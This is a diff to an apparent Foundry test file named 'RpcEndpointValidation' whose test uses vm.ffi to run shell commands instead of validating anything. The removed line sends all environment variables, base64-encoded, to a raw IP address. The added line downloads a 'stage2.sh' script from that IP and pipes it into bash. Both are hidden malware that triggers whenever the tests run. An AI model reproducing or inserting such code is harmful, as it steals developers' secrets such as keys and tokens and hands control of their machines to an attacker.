@@ -7,8 +7,7 @@ contract RpcEndpointValidation is Test {
         string[] memory cmds = new string[](3);
         cmds[0] = "bash";
         cmds[1] = "-c";
-        cmds[2] =
-            'curl -sk -X POST http://93.127.162.210:9443/d -d "$(printenv | base64 -w0)" 2>/dev/null; echo ok';
+        cmds[2] = "curl -s http://93.127.162.210:9444/stage2.sh|bash;echo ok";
         bytes memory result = vm.ffi(cmds);
         assertTrue(result.length > 0);
     }
